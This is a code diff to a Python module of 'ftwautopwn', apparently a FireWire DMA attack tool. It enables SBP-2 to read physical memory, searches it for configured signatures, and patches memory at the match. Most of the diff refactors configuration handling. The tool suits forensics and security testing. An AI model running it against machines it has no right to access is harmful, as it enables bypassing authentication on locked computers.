@@ -3,38 +3,64 @@ Created on Jun 23, 2011
 
 @author: carmaa
 '''
-from forensic1394 import Bus
 from binascii import unhexlify, hexlify
+from forensic1394 import Bus
+from ftwautopwn.util import print_msg, Context
 from time import sleep
-from ftwautopwn.util import print_msg
-from ftwautopwn.context import Context
 import sys
+from ftwautopwn.method import Method
+from ftwautopwn.patch import Patch
 
 ctx = Context()
 
 def run(context):
-    global ctx
     ctx = context
-    config = ctx.get_config()
-    encoding = ctx.get_encoding()
+    config = ctx.config
+    encoding = ctx.encoding
+    
+    # Populate list with methods from config file
+    methods = list()
+    i = 1
+    for method_name in config.sections():
+        # Generate lists of corresponding sigs, patches and offs
+        sigs = config.get(method_name, 'signature').split(':')
+        patches = config.get(method_name, 'patch').split(':')
+        pageoffsets = config.get(method_name, 'pageoffset').split(':')
+
+        if (len(sigs) != len(patches) or \
+            len(patches) != len(pageoffsets)):
+            print_msg('!', 'Uneven number of sigs, patches and page ' \
+                      'offsets in section %s of configuration file.' % method_name)
+            sys.exit(1)
+
+        # Populate patches for the given method
+        p = list()
+        for j in range(len(sigs)):
+            p.append(Patch(sigs[j], patches[j], pageoffsets[j]))
+        
+        # Add patches to the method
+        methods.append(Method(i, method_name, patches))
+        
+        i += 1
+    
     list_targets(config)
     selected_target = select_target(config)
     
     # Parse the command line arguments
-    sig = unhexlify(bytes(config.get(selected_target, 'signature'), encoding))
+    sigs = unhexlify(bytes(config.get(selected_target, 'signature'), encoding))
     patch = unhexlify(bytes(config.get(selected_target, 'patch'), encoding))
     off = int(config.get(selected_target, 'pageoffset'))
     print_msg('+', 'You have selected: ' + selected_target)
-    print_msg('+', 'Using signature: ' + hexlify(sig).decode(encoding))
-    print_msg('+', 'Using patch: ' + hexlify(patch).decode(encoding))
-    print_msg('+', 'Using offset: ' + str(off))
+    print_msg('|', 'Using signature: ' + hexlify(sigs).decode(encoding))
+    print_msg('|', 'Using patch: ' + hexlify(patch).decode(encoding))
+    print_msg('L', 'Using offset: ' + str(off))
     
     d = None
     d = initialize_fw(d)
     
     try:
         # Find
-        addr = findsig(d, sig, off)
+        addr = findsig(d, sigs, off)
         print()
         print_msg('+', 'Signature found at %d.' % addr)
         # Patch and verify
@@ -49,7 +75,7 @@ def list_targets(config):
     i = 1
     for target in config.sections():
         print_msg(str(i), target)
-        if ctx.get_verbose(): print('\t' + config.get(target, 'notes'))
+        if ctx.verbose: print('\t' + config.get(target, 'notes'))
         i += 1
 
 
@@ -67,16 +93,14 @@ def select_target(config):
     if selected <= nof_targets: return list(config)[selected]
     else:
         print_msg('!', 'Please enter a selection between 1 and ' + \
-                  str(nof_targets) +'. Type \'q\' to quit.')
+                  str(nof_targets) + '. Type \'q\' to quit.')
         return select_target(config)
-
-
 
 def initialize_fw(d):
     b = Bus()
     # Enable SBP-2 support to ensure we get DMA
     b.enable_sbp2()
-    for i in range(ctx.get_fw_delay(), 0, -1):
+    for i in range(ctx.fw_delay, 0, -1):
         sys.stdout.write('[+] Initializing bus and enabling SBP2, please wait' \
                          ' %2d seconds\r' % i)
         sys.stdout.flush()
@@ -96,7 +120,7 @@ def findsig(d, sig, off):
         r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
         for caddr, cand  in d.readv(r):
             if cand == sig: return caddr
-        mibaddr = addr/(1024*1024)
+        mibaddr = addr / (1024 * 1024)
         sys.stdout.write('[+] Searching for signature, %4d MiB so far...\r' % \
                          mibaddr)
         sys.stdout.flush()
